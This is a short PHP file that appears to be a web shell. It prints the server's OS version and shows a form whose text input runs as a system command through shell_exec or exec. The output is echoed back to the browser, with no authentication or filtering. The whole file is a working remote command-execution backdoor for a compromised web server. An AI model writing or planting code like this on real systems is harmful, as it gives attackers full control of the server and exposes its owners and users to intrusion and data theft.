
<?php
function create_page(){
    echo('<!DOCTYPE html>');
    echo('<html>');
    echo('    <body>');
    echo('        <form action="" method="post">');
    echo('            <br>');
    echo('            <label for="method">Execution Method:</label>');
    echo('            <select name="exec" id="method">');
    echo('                <option value="shell_exec">shell_exec</option>');
    echo('                <option value="exec">exec</option>');
    echo('            </select>');
    echo('');
    echo('            <br>');
    echo('            <br>');
    echo('            <input type=text name="in1">');
    echo('            <input type=submit name="btn" value="Execute">');
    echo('            <br>');
    echo('            <br>');
    echo('');
    echo('        </form>');
    echo('    </body>');
    echo('</html>');

    return 1;
}

echo ('<p>OS Version</p>');
echo php_uname();

$a = create_page();

if(isset($_POST['btn']))
{

    $command=$_POST['in1'];
    $exec_method=$_POST['exec'];

    echo $command, "<br><br>";
    if ($exec_method == "shell_exec"){
        echo(shell_exec($command));
    } else {
        echo(exec($command));
    }
}

?>
